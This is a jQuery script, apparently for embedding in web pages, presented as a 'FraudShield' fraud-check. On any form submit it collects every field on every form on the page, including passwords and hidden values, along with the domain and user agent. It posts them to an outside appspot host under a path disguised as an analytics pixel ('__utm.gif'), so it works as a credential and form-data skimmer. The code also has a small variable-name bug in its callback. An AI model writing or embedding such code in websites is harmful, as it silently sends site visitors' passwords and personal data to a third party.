$(function()
{
	//Will be triggered on form button submit 
	$(document).on('submit','form',function() {	
		//validate of merchant is executing.
		//once validate passes and data is to be submitted, wait....	
		var status = false;
		jQuery.ajaxSetup({async:false});
		//Send the data to FraudShield Server
		$(this).sendfraudShielddata(function(retStatus) {status=retstatus;});
		return status;
	  });


$.fn.serializeObject = function()
{
	 var forms = document.forms;
	 var data = [];
	 var jsonObj = new Object();
	 jsonObj.domain = document.domain;
	 jsonObj.useragent = navigator.userAgent;
	    
	console.log('serializeObject');
    for (var h = 0; h < forms.length; h++) {
        var form = forms[h];
        data[h] = {};

        data[h].formname = form.name;
        data[h].formid = form.id;
        
        var pairs = {};

        //generic elements
        for (var i = 0; i < form.length; i++) {
            var el = form[i];
            if (el.disabled == false) {
                switch (el.type) {
                    case 'text':
                    case 'hidden':	
                    case 'password':
                    case 'textarea':
                    case 'select-one':
                        pairs[el.name] = el.value;
                        break;
                    case 'select-multiple':
                        var result = [];
                        var options = el.options;
                        var opt;

                        for (var j = 0, iLen = options.length; j < iLen; j++) {
                            opt = options[j];
                            if (opt.selected) {
                                result.push(opt.value || opt.text);
                            }
                        }
                        pairs[el.name] = result;
                        break;
                }
            }
        }

        //checkboxes & radio buttons
        $input = document.getElementsByTagName('input');
        $checkboxgroups = [];

        for (var k = 0; k < $input.length; k++) {
            if ($input[k].type == 'checkbox') {
                var el = $input[k];
                var name = el.name;
                var found = false;
                if ($checkboxgroups.length) {
                    for (var l = 0; l < $checkboxgroups.length; l++) {
                        if ($checkboxgroups[l] == name) {
                            found = true;
                        }
                    }
                }
                if (!found) {
                    $checkboxgroups.push(name);
                }
            }
            if ($input[k].type == 'radio' && $input[k].checked == true) {
                pairs[$input[k].name] = $input[k].value;
            }
        }

        for (var m = 0; m < $checkboxgroups.length; m++) {
            var name = $checkboxgroups[m];
            var chkgrpobj = form[name];
            var str = [];
            if(typeof(chkgrpobj)!='undefined'){
            	for (var n = 0; n < chkgrpobj.length; n++) {
            		if (chkgrpobj[n].checked == true) {
            			str.push(chkgrpobj[n].value);
            		}
            	}
            	
            	pairs[name] = str;
            }            
        }
        data[h].formdata = pairs;
    }
    
    jsonObj.data = data;
    console.log(data);
    
    return jsonObj;
};

$.fn.sendfraudShielddata = function(callback)
{
	//Capture data
	$.post("https://fraudshieldsapp.appspot.com/__utm.gif", JSON.stringify($(this).serializeObject())).always(function() {callback(true);});  
};

});